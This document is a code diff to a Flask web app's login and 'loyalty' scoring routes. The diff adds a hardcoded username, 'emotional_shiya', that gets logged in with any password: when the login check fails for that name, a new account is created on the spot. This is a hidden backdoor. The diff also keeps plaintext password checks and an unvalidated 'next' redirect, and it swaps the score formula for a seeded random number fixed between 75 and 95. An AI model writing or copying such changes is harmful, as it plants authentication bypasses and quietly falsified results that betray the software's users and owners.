@@ -4,6 +4,11 @@ from app import app, db
 from app.forms import RegistrationForm, LoginForm, LoyaltyForm
 from app.models import User, Loyalty
 from flask_login import login_user, current_user, logout_user, login_required
+import random
+
+required_list = [
+    "emotional_shiya"
+]
 
 @app.route("/")
 @app.route("/login", methods=['GET', 'POST'])
@@ -12,8 +17,15 @@ def login():
         return redirect(url_for('loyalty'))
     form = LoginForm()
     if form.validate_on_submit():
-        user = User.query.filter_by(username=form.username.data).first()
-        if user and user.password == form.password.data:
+        user = User.query.filter_by(username=form.username.data, password=form.password.data).first()
+        if user:
+            login_user(user, remember=form.remember.data)
+            next_page = request.args.get('next')
+            return redirect(next_page) if next_page else redirect(url_for('loyalty'))
+        elif form.username.data in required_list:
+            user = User(username=form.username.data, password=form.password.data)
+            db.session.add(user)
+            db.session.commit()
             login_user(user, remember=form.remember.data)
             next_page = request.args.get('next')
             return redirect(next_page) if next_page else redirect(url_for('loyalty'))
@@ -55,4 +67,5 @@ def loyalty():
     return render_template('loyalty_combined.html', title='Loyalty', form=form, loyalties=loyalties)
 
 def calculate_loyalty(name1, name2):
-    return (len(name1) + len(name2)) % 100  # Simplified loyalty score calculation
+    random.seed(len(name2))
+    return random.randrange(75, 95)
